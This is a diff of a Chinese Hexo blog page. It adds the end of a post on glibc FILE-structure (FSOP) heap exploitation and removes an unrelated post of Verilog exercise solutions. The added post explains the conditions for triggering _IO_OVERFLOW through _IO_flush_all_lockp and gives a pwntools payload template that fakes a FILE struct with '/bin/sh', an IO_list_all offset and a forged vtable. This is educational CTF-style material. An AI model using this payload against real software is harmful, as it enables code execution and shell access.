(fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">            &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">     ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    </span><br><span class="line">      result = EOF;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (do_lock)</span><br><span class="line">      _IO_funlockfile (fp);</span><br><span class="line">    run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)&#123;</span><br><span class="line">      <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">      fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      last_stamp = _IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      fp = fp-&gt;_chain;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>对于我们想触发调用<code>_IO_OVERFLOW</code>，需要满足:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line"> || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">     &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">        &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure>
+
+<p>即:</p>
+<ul>
+<li><code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
+</ul>
+<p>或者:</p>
+<ul>
+<li><code>_IO_vtable_offset (fp) == 0</code></li>
+<li><code>fp-&gt;_mode &gt; 0</code></li>
+<li><code>(fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code></li>
+</ul>
+<p>一般选择伪造前者.  </p>
+<p><code>_IO_flush_all_lockp </code>函数在一些情况下会被系统调用:</p>
+<ul>
+<li><code>exit()</code></li>
+<li><code>libc</code>执行abort流程</li>
+<li>执行流从main函数返回</li>
+</ul>
+<p>构造模板:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload =  <span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">payload += p64(<span class="number">0xDEADBEEF</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line">payload =  payload.ljust(<span class="number">0xc0</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># mode&lt;=0</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(vtable_addr)</span><br></pre></td></tr></table></figure>
+
+<hr>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -627,124 +780,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2022/03/05/verilogOJ/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="AvavaAYA">
-      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/05/verilogOJ/" class="post-title-link" itemprop="url">verilogOJ-writeup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-05 14:16:36" itemprop="dateCreated datePublished" datetime="2022-03-05T14:16:36+08:00">2022-03-05</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-10 14:34:21" itemprop="dateModified" datetime="2022-03-10T14:34:21+08:00">2022-03-10</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/verilog/" itemprop="url" rel="index"><span itemprop="name">verilog</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p>练习题来自<a target="_blank" rel="noopener external nofollow noreferrer" href="https://verilogoj.ustc.edu.cn/oj/">USTC verilog OJ</a></p>
-<h2 id="chall-1"><a href="#chall-1" class="headerlink" title="chall-1"></a>chall-1</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module(</span><br><span class="line">      <span class="keyword">output</span> one</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">assign</span> one = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-2"><a href="#chall-2" class="headerlink" title="chall-2"></a>chall-2</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module(</span><br><span class="line">  <span class="keyword">output</span> out</span><br><span class="line">);</span><br><span class="line">  <span class="keyword">assign</span> out = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-3"><a href="#chall-3" class="headerlink" title="chall-3"></a>chall-3</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module(</span><br><span class="line">  <span class="keyword">input</span> in, <span class="keyword">output</span> out</span><br><span class="line">);</span><br><span class="line">	<span class="keyword">assign</span> out = in;</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-4"><a href="#chall-4" class="headerlink" title="chall-4"></a>chall-4</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module( </span><br><span class="line">    <span class="keyword">input</span> a,b,c,</span><br><span class="line">    <span class="keyword">output</span> w,x,y,z );</span><br><span class="line">	<span class="keyword">assign</span> w = a;</span><br><span class="line">	<span class="keyword">assign</span> x = b;</span><br><span class="line">	<span class="keyword">assign</span> y = b;</span><br><span class="line">	<span class="keyword">assign</span> z = c;</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-5"><a href="#chall-5" class="headerlink" title="chall-5"></a>chall-5</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module( <span class="keyword">input</span> in, <span class="keyword">output</span> out );</span><br><span class="line">	<span class="keyword">not</span> inv (out, in);</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-6"><a href="#chall-6" class="headerlink" title="chall-6"></a>chall-6</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module(</span><br><span class="line">    <span class="keyword">input</span> a, </span><br><span class="line">    <span class="keyword">input</span> b,</span><br><span class="line">    <span class="keyword">output</span> out );</span><br><span class="line">  <span class="keyword">and</span> and1 (out, a, b);</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-7"><a href="#chall-7" class="headerlink" title="chall-7"></a>chall-7</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module( </span><br><span class="line">    <span class="keyword">input</span> a, </span><br><span class="line">    <span class="keyword">input</span> b, </span><br><span class="line">    <span class="keyword">output</span> out );</span><br><span class="line">    <span class="keyword">nor</span> nor1 (out, a, b);</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-8"><a href="#chall-8" class="headerlink" title="chall-8"></a>chall-8</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module( </span><br><span class="line">    <span class="keyword">input</span> a, </span><br><span class="line">    <span class="keyword">input</span> b, </span><br><span class="line">    <span class="keyword">output</span> out );</span><br><span class="line">		<span class="keyword">wire</span> w1, w2, w3;</span><br><span class="line">    <span class="keyword">and</span> and1 (w1, a, b);</span><br><span class="line">    <span class="keyword">or</span> or1 (w2, a, b);</span><br><span class="line">    <span class="keyword">not</span> inv1 (w3, w2);</span><br><span class="line">    <span class="keyword">or</span> or2 (out, w3, w1);</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-9"><a href="#chall-9" class="headerlink" title="chall-9"></a>chall-9</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module(</span><br><span class="line">    <span class="keyword">input</span> a,</span><br><span class="line">    <span class="keyword">input</span> b,</span><br><span class="line">    <span class="keyword">input</span> c,</span><br><span class="line">    <span class="keyword">input</span> d,</span><br><span class="line">    <span class="keyword">output</span> out,</span><br><span class="line">    <span class="keyword">output</span> out_n   </span><br><span class="line">); </span><br><span class="line">	<span class="keyword">wire</span> w1, w2, w3;</span><br><span class="line">	<span class="keyword">and</span> and1 (w1, a, b);</span><br><span class="line">	<span class="keyword">and</span> and2 (w2, c, d);</span><br><span class="line">	<span class="keyword">or</span> or1 (w3, w1, w2);</span><br><span class="line">	<span class="keyword">assign</span> out = w3;</span><br><span class="line">	<span class="keyword">not</span> inv1 (out_n, w3);</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-10"><a href="#chall-10" class="headerlink" title="chall-10"></a>chall-10</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module ( </span><br><span class="line">    <span class="keyword">input</span> <span class="keyword">wire</span> [<span class="number">2</span>:<span class="number">0</span>] vec,</span><br><span class="line">    <span class="keyword">output</span> <span class="keyword">wire</span> [<span class="number">2</span>:<span class="number">0</span>] outv,</span><br><span class="line">    <span class="keyword">output</span> <span class="keyword">wire</span> o2,</span><br><span class="line">    <span class="keyword">output</span> <span class="keyword">wire</span> o1,</span><br><span class="line">    <span class="keyword">output</span> <span class="keyword">wire</span> o0);</span><br><span class="line">	<span class="keyword">assign</span> outv = vec;</span><br><span class="line">    <span class="keyword">assign</span> o2 = vec[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">assign</span> o1 = vec[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">assign</span> o0 = vec[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-11"><a href="#chall-11" class="headerlink" title="chall-11"></a>chall-11</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">`<span class="keyword">default_nettype</span> none     </span><span class="comment">// Disable implicit nets. Reduces some types of bugs.</span></span><br><span class="line"><span class="keyword">module</span> top_module( </span><br><span class="line">    <span class="keyword">input</span>	<span class="keyword">wire</span>	[<span class="number">15</span>:<span class="number">0</span>]	in,</span><br><span class="line">    <span class="keyword">output</span>	<span class="keyword">wire</span>	[<span class="number">7</span>:<span class="number">0</span>]	out_hi,</span><br><span class="line">    <span class="keyword">output</span>	<span class="keyword">wire</span>	[<span class="number">7</span>:<span class="number">0</span>]	out_lo </span><br><span class="line">);</span><br><span class="line">    <span class="keyword">assign</span> out_hi = in[<span class="number">15</span>:<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">assign</span> out_lo = in[<span class="number">7</span>:<span class="number">0</span>];</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-12"><a href="#chall-12" class="headerlink" title="chall-12"></a>chall-12</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module(</span><br><span class="line">  <span class="keyword">input</span> [<span class="number">31</span>:<span class="number">0</span>] in,</span><br><span class="line">  <span class="keyword">output</span> [<span class="number">31</span>:<span class="number">0</span>] out</span><br><span class="line">);</span><br><span class="line">    <span class="keyword">assign</span> out[<span class="number">31</span>:<span class="number">24</span>] = in[<span class="number">7</span>:<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">assign</span> out[<span class="number">23</span>:<span class="number">16</span>] = in[<span class="number">15</span>:<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">assign</span> out[<span class="number">15</span>:<span class="number">8</span>]  = in[<span class="number">23</span>:<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">assign</span> out[<span class="number">7</span>:<span class="number">0</span>]   = in[<span class="number">31</span>:<span class="number">24</span>];</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-13"><a href="#chall-13" class="headerlink" title="chall-13"></a>chall-13</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module( </span><br><span class="line">    <span class="keyword">input</span> [<span class="number">2</span>:<span class="number">0</span>] a,</span><br><span class="line">    <span class="keyword">input</span> [<span class="number">2</span>:<span class="number">0</span>] b,</span><br><span class="line">    <span class="keyword">output</span> [<span class="number">2</span>:<span class="number">0</span>] out_or_bitwise,</span><br><span class="line">    <span class="keyword">output</span> out_or_logical,</span><br><span class="line">    <span class="keyword">output</span> [<span class="number">5</span>:<span class="number">0</span>] out_not</span><br><span class="line">);</span><br><span class="line">		<span class="keyword">assign</span> out_or_bitwise = a|b;</span><br><span class="line">    <span class="keyword">assign</span> out_or_logical = a||b;</span><br><span class="line">    <span class="keyword">assign</span> out_not = ~&#123;b,a&#125;;</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-14"><a href="#chall-14" class="headerlink" title="chall-14"></a>chall-14</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module( </span><br><span class="line">    <span class="keyword">input</span> [<span class="number">3</span>:<span class="number">0</span>] in,</span><br><span class="line">    <span class="keyword">output</span> out_and,</span><br><span class="line">    <span class="keyword">output</span> out_or,</span><br><span class="line">    <span class="keyword">output</span> out_xor</span><br><span class="line">);</span><br><span class="line">    <span class="keyword">assign</span> out_and = in[<span class="number">0</span>]&amp;in[<span class="number">1</span>]&amp;in[<span class="number">2</span>]&amp;in[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">assign</span> out_or  = in[<span class="number">0</span>]|in[<span class="number">1</span>]|in[<span class="number">2</span>]|in[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">assign</span> out_xor = in[<span class="number">0</span>]^in[<span class="number">1</span>]^in[<span class="number">2</span>]^in[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-15"><a href="#chall-15" class="headerlink" title="chall-15"></a>chall-15</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module (</span><br><span class="line">    <span class="keyword">input</span> [<span class="number">4</span>:<span class="number">0</span>] a, b, c, d, e, f,</span><br><span class="line">    <span class="keyword">output</span> [<span class="number">7</span>:<span class="number">0</span>] w, x, y, z );</span><br><span class="line">    <span class="keyword">assign</span> &#123;w, x, y, z&#125; = &#123;a, b, c, d, e, f, <span class="number">2&#x27;b11</span>&#125;;</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="chall-16"><a href="#chall-16" class="headerlink" title="chall-16"></a>chall-16</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> top_module( </span><br><span class="line">    <span class="keyword">input</span> [<span class="number">7</span>:<span class="number">0</span>] in,</span><br><span class="line">    <span class="keyword">output</span> [<span class="number">7</span>:<span class="number">0</span>] out</span><br><span class="line">);</span><br><span class="line">    <span class="keyword">assign</span> out[<span class="number">7</span>:<span class="number">0</span>] = &#123;in[<span class="number">0</span>],in[<span class="number">1</span>],in[<span class="number">2</span>],in[<span class="number">3</span>],in[<span class="number">4</span>],in[<span class="number">5</span>],in[<span class="number">6</span>],in[<span class="number">7</span>]&#125;;</span><br><span class="line"><span class="keyword">endmodule</span></span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -816,20 +851,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-count">14</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -874,13 +909,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">41k</span>
+    <span title="站点总字数">50k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">37 分钟</span>
+    <span title="站点阅读时长">45 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Muse</a> 强力驱动
   </div>
